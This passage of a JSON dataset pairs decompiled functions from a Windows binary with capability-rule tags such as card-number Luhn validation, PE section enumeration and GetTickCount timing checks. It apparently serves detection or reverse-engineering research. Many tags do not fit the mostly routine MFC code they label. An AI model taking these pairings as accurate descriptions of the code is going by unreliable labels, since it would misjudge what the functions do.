== 0x6b) {\ncode_r0x004219a7:\n                return 2;\n            }\n            if (0x47 < param_1) {\n                if (param_1 == 0x50) {\n                    return 5;\n                }\n                if (param_1 == 0x52) {\n                    return 5;\n                }\n                if (param_1 == 0x55) {\n                    return 3;\n                }\n                if (param_1 != 0x56) {\n                    if (param_1 == 0x58) {\n                        return 10;\n                    }\n                    return 1;\n                }\n                return 5;\n            }\n            if (param_1 == 0x47) {\n                return 5;\n            }\n            if (param_1 == 0x40) {\n                return 5;\n            }\n            if (param_1 == 0x41) {\n                return 5;\n            }\n            if (param_1 == 0x42) {\n                return 6;\n            }\n            if (param_1 == 0x43) {\n                return 3;\n            }\n            iVar1 = param_1 - 0x44;\n            if (iVar1 == 0) {\n                return 4;\n            }\n        }\n        else {\n            if (param_1 < 0x91) {\n                if (param_1 == 0x90) {\n                    return 3;\n                }\n                if (param_1 < 0x76) {\n                    if (param_1 == 0x75) {\n                        return 10;\n                    }\n                    if (param_1 == 0x6c) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0x6f) {\n                        return 3;\n                    }\n                    if (param_1 == 0x70) {\n                        return 0xd;\n                    }\n                    if (param_1 == 0x71) {\n                        return 4;\n                    }\n                    if (param_1 != 0x72) {\n                        return 1;\n                    }\n                    return 6;\n                }\n                if (param_1 == 0x7b) {\n                    return 3;\n                }\n                if (param_1 == 0x7c) {\n                    return 3;\n                }\n                if (param_1 == 0x7d) {\n                    return 3;\n                }\n                iVar1 = param_1 - 0x83;\n                if (iVar1 == 0) {\n                    return 9;\n                }\n                goto code_r0x0042191d;\n            }\n            if (param_1 < 0xb7) {\n                if (param_1 == 0xb6) {\n                    return 6;\n                }\n                if (param_1 == 0x91) {\n                    return 7;\n                }\n                if (param_1 == 0x9a) {\n                    return 3;\n                }\n                if (param_1 != 0xa1) {\n                    if (param_1 == 0xa7) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0xaa) {\n                        return 5;\n                    }\n                    return 1;\n                }\n                return 3;\n            }\n            if (param_1 == 0xb7) {\n                return 5;\n            }\n            if (param_1 == 0xbf) {\n                return 6;\n            }\n            if (param_1 == 0xc1) {\n                return 6;\n            }\n            iVar1 = param_1 - 0xce;\n            if (iVar1 == 0) {\n                return 3;\n            }\n        }\n        if (iVar1 == 2) {\ncode_r0x004219a7:\n            return 3;\n        }\n    }\ncode_r0x004219a7:\n    return 1;\n}\n",
        "token_count": 1732
    },
    "0042401d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042401d(void)\n\n{\n    fcn.00423ff7();\n    fcn.00424808(0x4238d5);\n    return;\n}\n",
        "token_count": 40
    },
    "0042533e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042533e(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *(param_1 + 8);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(piVar1);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(param_1 + 4);\n    return;\n}\n",
        "token_count": 95
    },
    "004254a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004254a2(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00425394(param_1);\n    *param_1 = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00425442(unaff_retaddr);\n        *param_1 = iVar1;\n        iVar1 = (-(iVar1 != 0) & 0x7fffbffe) + 0x80004002;\n    }\n    else {\n        fcn.0042533e();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 150
    },
    "004257e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.004257e7(int32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = *(param_1 + 0x28);\n    bVar2 = uVar1 < *(param_1 + 0x2c);\n    if (bVar2) {\n        fcn.0040bb50(param_2, *(param_1 + 0x1c) * uVar1 + *(param_1 + 0x24), *(param_1 + 0x1c));\n        *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 167
    },
    "00425e3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00425e3e(uint8_t *param_1, uint16_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = *(param_2 * 4 + 0x42b320) + 4;\n    uVar2 = *param_1;\n    while (uVar2 != 0) {\n        if (uVar2 != 0xff) {\n            iVar4 = 0x42b35c;\n            if ((uVar2 & 0x40) == 0) {\n                iVar4 = 0x42b398;\n            }\n            iVar3 = iVar3 + *(iVar4 + (uVar2 & 0xffffffbf) * 4);\n        }\n        puVar1 = param_1 + 1;\n        param_1 = param_1 + 1;\n        uVar2 = *puVar1;\n    }\n    return iVar3;\n}\n",
        "token_count": 227
    },
    "0042640f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11ch\n\nvoid __cdecl fcn.0042640f(ushort *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uchar *puStack316;\n    uint *puStack312;\n    uint uStack308;\n    uint *puStack304;\n    ushort *puStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uint var_11ch;\n    uint var_110h;\n    uint32_t var_10h;\n    uint *var_ch;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    uStack292 = 0x20;\n    puStack296 = NULL;\n    puStack300 = arg_8h;\n    puStack304 = 0x426428;\n    fcn.0040b990();\n    var_ch = &fcn.0042640f::var_110h;\n    uStack292 = 0x42b2f0;\n    puStack296 = 0x426441;\n    iVar4 = fcn.00420741();\n    pcVar3 = _sym.imp.KERNEL32.dll_lstrlenA;\n    pcVar2 = _sym.imp.KERNEL32.dll_MultiByteToWideChar;\n    if (iVar4 == 0) {\n        puStack296 = 0x42abc8;\n        puStack300 = 0x426520;\n        iVar4 = fcn.00420741();\n        puStack304 = &fcn.0042640f::var_110h;\n        puStack300 = 0x100;\n        if (iVar4 == 0) {\n            uStack308 = 0xf108;\n            puStack312 = 0x42654e;\n            fcn.00420632();\n            *arg_8h = 0xf108;\n        }\n        else {\n            uStack308 = 0xf10a;\n            puStack312 = 0x42653a;\n            fcn.00420632();\n            *arg_8h = 0xf10a;\n        }\n    }\n    else {\n        var_ch = *(arg_ch + 0xc);\n        *arg_8h = *(arg_ch + 8);\n        *(arg_8h + 8) = *(arg_ch + 0x10);\n        *(arg_8h + 0xe) = *(arg_ch + 0x1c);\n        var_10h = *(arg_ch + 0x14);\n        if (*(var_10h - 8) != 0) {\n            if (var_10h == 0) {\n                puStack296 = NULL;\n            }\n            else {\n                puStack300 = 0x42648a;\n                var_8h = &stack0xfffffed8;\n                puStack296 = var_10h;\n                var_4h = (*pcVar3)();\n                var_4h = var_4h + 1;\n                puStack300 = 0x42649a;\n                fcn.0040b610();\n                puStack300 = var_4h;\n                uStack308 = 0xffffffff;\n                puStack312 = var_10h;\n                puStack296 = puStack296 & 0xffff0000;\n                puStack316 = NULL;\n                puStack304 = &stack0xfffffed8;\n                (*pcVar2)(0);\n                puStack296 = var_8h;\n            }\n            puStack300 = 0x4264b9;\n            uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n            *(arg_8h + 6) = uVar5;\n        }\n        uVar1 = *(arg_ch + 0x18);\n        if (*(uVar1 - 8) != 0) {\n            if (uVar1 == 0) {\n                puStack312 = NULL;\n            }\n            else {\n                puStack316 = 0x4264dc;\n                puStack312 = uVar1;\n                var_4h = (*pcVar3)();\n                var_4h = var_4h + 1;\n                puStack316 = 0x4264ec;\n                fcn.0040b610();\n                puStack316 = var_4h;\n                puStack312 = puStack312 & 0xffff0000;\n                var_8h = &stack0xfffffec8;\n                (*pcVar2)(0, 0, uVar1, 0xffffffff, &stack0xfffffec8);\n                puStack312 = var_8h;\n            }\n            puStack316 = 0x42650b;\n            uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n            *(arg_8h + 2) = uVar5;\n        }\n    }\n    if (var_ch == NULL) {\n        puVar6 = NULL;\n    }\n    else {\n        puStack312 = var_ch;\n        puStack316 = 0x426564;\n        puVar6 = &stack0xfffffec8;\n        var_4h = (*pcVar3)();\n        var_4h = var_4h + 1;\n        puStack316 = 0x426574;\n        fcn.0040b610();\n        puStack316 = var_4h;\n        puStack312 = puStack312 & 0xffff0000;\n        (*pcVar2)(0, 0, var_ch, 0xffffffff, &stack0xfffffec8);\n    }\n    puStack316 = 0x426593;\n    puStack312 = puVar6;\n    uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n    *(arg_8h + 4) = uVar5;\n    if (*(arg_8h + 2) == 0) {\n        puStack316 = 0x4265a3;\n        iVar4 = fcn.00423ff7();\n        uVar1 = *(iVar4 + 0x10);\n        if (uVar1 == 0) {\n            puStack316 = NULL;\n        }\n        else {\n            puStack316 = uVar1;\n            var_4h = (*pcVar3)();\n            var_4h = var_4h + 1;\n            fcn.0040b610();\n            puStack316 = puStack316 & 0xffff0000;\n            var_8h = &stack0xfffffec4;\n            (*pcVar2)(0, 0, uVar1, 0xffffffff, &stack0xfffffec4, var_4h);\n            puStack316 = var_8h;\n        }\n        uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n        *(arg_8h + 2) = uVar5;\n    }\n    if ((*(arg_8h + 6) == 0) && (*(arg_8h + 8) != 0)) {\n        puStack316 = 0x4265f8;\n        iVar4 = fcn.00423ff7();\n        uVar1 = *(*(iVar4 + 4) + 0x8c);\n        puStack316 = NULL;\n        if (uVar1 != 0) {\n            puStack316 = uVar1;\n            iVar4 = (*pcVar3)();\n            fcn.0040b610();\n            puStack316 = puStack316 & 0xffff0000;\n            var_8h = &stack0xfffffec4;\n            (*pcVar2)(0, 0, uVar1, 0xffffffff, &stack0xfffffec4, iVar4 + 1);\n            puStack316 = var_8h;\n        }\n        uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n        *(arg_8h + 6) = uVar5;\n    }\n    return;\n}\n",
        "token_count": 1743
    },
    "00426c62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426c62(code *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint unaff_retaddr;\n    \n    *(param_2 + param_3) = unaff_retaddr;\n    *((param_2 + param_3) - param_3) = 0x426c72;\n    (*param_1)();\n    return;\n}\n",
        "token_count": 87
    },
    "0042795b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042795b(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable._AFX_WIN_STATE.0;\n    *(unaff_EBP + -4) = 0;\n    fcn.004225a1(extraout_ECX + 1, extraout_ECX);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 172
    },
    "00427aa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00427aa1(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    char *arg_8h;\n    \n    iVar2 = fcn.00423ff7();\n    fcn.00424b3c(1);\n    arg_8h = iVar2 + 0x34;\n    while (*arg_8h != '\\0') {\n        puVar3 = fcn.0040bea2(arg_8h, 10);\n        *puVar3 = 0;\n        iVar4 = fcn.00423ff7();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(arg_8h, *(iVar4 + 8));\n        arg_8h = puVar3 + 1;\n    }\n    *(iVar2 + 0x34) = '\\0';\n    fcn.00424bac(1);\n    iVar2 = fcn.00423ff7();\n    if ((*(iVar2 + 4) != 0) && (pcVar1 = *(*(iVar2 + 4) + 0x54),  pcVar1 != NULL)) {\n        (*pcVar1)(1, 0);\n    }\n    iVar2 = fcn.00423dca();\n    if (*(iVar2 + 0xcc) != NULL) {\n        iVar4 = (**(**(iVar2 + 0xcc) + 0xb8))();\n        if (iVar4 != 0) {\n            *(iVar2 + 0xcc) = 0;\n        }\n    }\n    iVar4 = fcn.00423ff7();\n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (*(iVar4 + 0x14) == '\\0') {\n        if (*(iVar2 + 0x30) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar2 + 0x30));\n            *(iVar2 + 0x30) = 0;\n        }\n        if (*(iVar2 + 0x2c) != 0) {\n            (*pcVar1)(*(iVar2 + 0x2c));\n            *(iVar2 + 0x2c) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 502
    },
    "0040716a": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0040716a(code **param_1, code *param_2)\n\n{\n    param_1[1] = param_2;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    fcn.0041b65a(10);\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = NULL;\n    param_1[0x12] = NULL;\n    param_1[0x13] = NULL;\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    param_1[0x16] = NULL;\n    *param_1 = vtable.CDataSourceControl.0;\n    return param_1;\n}\n",
        "token_count": 228
    },
    "00407eae": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00407eae(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h, int32_t arg_2ch, uint arg_30h)\n\n{\n    if ((arg_10h & 0x4000) == 0) {\n        arg_8h[8] = 0;\n    }\n    else {\n        arg_8h[8] = 1;\n    }\n    *(arg_8h + 0xc) = arg_10h;\n    arg_8h[5] = arg_30h;\n    *(arg_8h + 0x32) = arg_18h;\n    arg_8h[9] = arg_20h;\n    *(arg_8h + 0x33) = arg_1ch;\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_24h;\n    arg_8h[10] = arg_14h;\n    arg_8h[7] = 1;\n    arg_8h[0xb] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[6] = 0;\n    if (arg_28h != 0) {\n        arg_8h[7] = 3;\n        arg_8h[2] = arg_28h;\n    }\n    if (arg_2ch != 0) {\n        arg_8h[7] = arg_8h[7] | 4;\n        arg_8h[3] = arg_2ch;\n    }\n    return;\n}\n",
        "token_count": 417
    },
    "004097f7": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004097f7(uint *param_1, uint param_2, uint param_3, ushort param_4)\n\n{\n    *param_1 = 0;\n    *(param_1 + 1) = param_4;\n    param_1[3] = 0;\n    param_1[5] = 0;\n    param_1[2] = param_3;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 107
    },
    "0041b65a": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b65a(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CPtrList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 106
    },
    "0041b830": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b830(code **param_1, code *param_2)\n\n{\n    param_1[1] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CMapPtrToPtr.0;\n    param_1[2] = 0x11;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 110
    },
    "0041c2ea": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c2ea(int32_t param_1)\n\n{\n    *(param_1 + 4) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 109
    },
    "0041c5da": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c5da(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 127
    },
    "00422f4b": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00422f4b(code **param_1, code *param_2, code *param_3, code *param_4)\n\n{\n    fcn.00420f42();\n    param_1[5] = NULL;\n    param_1[4] = param_4;\n    param_1[9] = NULL;\n    *param_1 = vtable.CMemFile.0;\n    param_1[7] = ~-(param_4 != NULL) & param_3;\n    param_1[8] = param_2;\n    param_1[6] = param_3;\n    return param_1;\n}\n",
        "token_count": 146
    },
    "00422f87": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00422f87(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CMemFile.0;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.0042316e();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    fcn.00420f97();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 258
    },
    "0042316e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042316e(int32_t *param_1)\n\n{\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    if ((param_1[8] != 0) && (param_1[9] != 0)) {\n        (**(*param_1 + 0x60))(param_1[8]);\n    }\n    param_1[8] = 0;\n    return;\n}\n",
        "token_count": 125
    },
    "00423b1d": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint fcn.00423b1d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*0x44d754 == 0) {\n        iVar2 = fcn.0042489d(0x4239cb);\n        if (*(iVar2 + 4) == 0) {\n            *(iVar2 + 0xc) = 0x416e70;\n            *(iVar2 + 0x10) = 0x416ee0;\n            *(iVar2 + 0x14) = fcn.00416fa0;\n            *(iVar2 + 0x18) = 0x417120;\n            *(iVar2 + 0x1c) = 0x4175c0;\n            *(iVar2 + 0x20) = 0x4174c0;\n            *(iVar2 + 0x24) = fcn.004178a0;\n            *(iVar2 + 0x28) = 0x4171c0;\n            *(iVar2 + 0x2c) = 0x417300;\n            iVar3 = fcn.00423ff7();\n            iVar3 = (**(iVar2 + 0xc))(*(iVar3 + 8));\n            if (iVar3 == 0) {\n                *(iVar2 + 0xc) = 0;\n                *(iVar2 + 0x10) = 0;\n                *(iVar2 + 0x14) = 0;\n                *(iVar2 + 0x18) = 0;\n                *(iVar2 + 0x1c) = 0;\n                *(iVar2 + 0x20) = 0;\n                *(iVar2 + 0x24) = 0;\n                *(iVar2 + 0x28) = 0;\n                *(iVar2 + 0x2c) = 0;\n            }\n            *(iVar2 + 4) = 1;\n        }\n        if (*(iVar2 + 0x14) == 0) {\n            uVar1 = 0;\n        }\n        else {\n            iVar3 = fcn.00423ff7();\n            uVar1 = (**(iVar2 + 0x14))(*(iVar3 + 8));\n        }\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 517
    },
    "00423dfb": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00423dfb(code **param_1, uchar param_2)\n\n{\n    param_1[7] = NULL;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    param_1[10] = NULL;\n    param_1[0x40f] = NULL;\n    param_1[0x410] = NULL;\n    param_1[0x413] = 0xffffffff;\n    param_1[0x414] = NULL;\n    param_1[0x419] = NULL;\n    param_1[0x41a] = NULL;\n    *param_1 = vtable.AFX_MODULE_STATE.0;\n    param_1[10] = 0x1c;\n    param_1[8] = 0x14;\n    param_1[6] = NULL;\n    *(param_1 + 5) = param_2;\n    param_1[0xc] = 0x1;\n    param_1[0x410] = 0x18;\n    return;\n}\n",
        "token_count": 239
    },
    "004263a8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004263a8(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.COleDispatchException.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.0041d2bd();\n    *(unaff_EBP + -4) = 1;\n    fcn.0041d2bd();\n    *(unaff_EBP + -4) = 0;\n    fcn.0041d2bd();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 209
    },
    "0040831a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040831a(int32_t param_1)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (*(param_1 + 0x48) == 0) {\n        if (*(param_1 + 0x38) != 0) {\n            var_10h = *(param_1 + 0x40);\n            var_ch = 0;\n            var_8h = 0;\n            var_18h = 1;\n            var_14h = 0;\n            uVar1 = (**(**(param_1 + 8) + 0x20))(*(param_1 + 8), 1, 0x42c8a4, 0, 0, &var_18h);\n            return uVar1;\n        }\n    }\n    else if ((*(param_1 + 0x50) != 0) && (*(*(param_1 + 0x50) + 0xc) != 0)) {\n        uVar1 = fcn.00407aeb();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 273
    },
    "00420773": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint fcn.00420773(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    uVar2 = 0;\n    iVar1 = *(extraout_ECX + 0xc);\n    *(unaff_EBP + -0x10) = &var_14h;\n    if (iVar1 != 0) {\n        *(unaff_EBP + -0x14) = 0;\n        *(unaff_EBP + -4) = 0;\n        uVar2 = (**(extraout_ECX + 0xc))();\n        *(unaff_EBP + -0x14) = uVar2;\n        uVar2 = *(unaff_EBP + -0x14);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 273
    },
    "00422446": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00422446(void)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    uchar auStack32 [12];\n    code *pcStack20;\n    int32_t iVar2;\n    uint32_t uStack8;\n    \n    iVar2 = 0x42f800;\n    uStack8 = 0x44d2a0;\n    pcStack20 = fcn.0042245f;\n    fcn.0040c2cc(&uStack8, 0x42f800);\n    if ((iVar2 != 0) &&\n       (pcStack20 = &stack0xfffffffc,  uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar2, 0xfffffff0), \n       (uVar1 & 0xf) == uStack8)) {\n        (*_sym.imp.USER32.dll_GetClassNameA)(iVar2, auStack32, 10);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(auStack32, \"combobox\");\n        return iVar2 == 0;\n    }\n    return false;\n}\n",
        "token_count": 243
    },
    "00422549": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422549(uint hWnd, uint lpString2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpString1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString2);\n    if (((uVar1 < 0x101) && (uVar2 = (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, &lpString1, 0x100),  uVar2 == uVar1))\n       && (iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&lpString1, lpString2),  iVar3 == 0)) {\n        return;\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(hWnd, lpString2);\n    return;\n}\n",
        "token_count": 184
    },
    "00424dd0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00424dd0(void)\n\n{\n    uint uVar1;\n    uint32_t var_14h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)(&var_14h);\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar1);\n    return 1 < var_14h;\n}\n",
        "token_count": 80
    },
    "0041b2fc": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b2fc(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.00420632(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 98
    },
    "0041b699": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b699(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.0041b81a();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 103
    },
    "0041b8b8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b8b8(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.0041bd2d(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.0041b81a();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 126
    },
    "0042573e": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
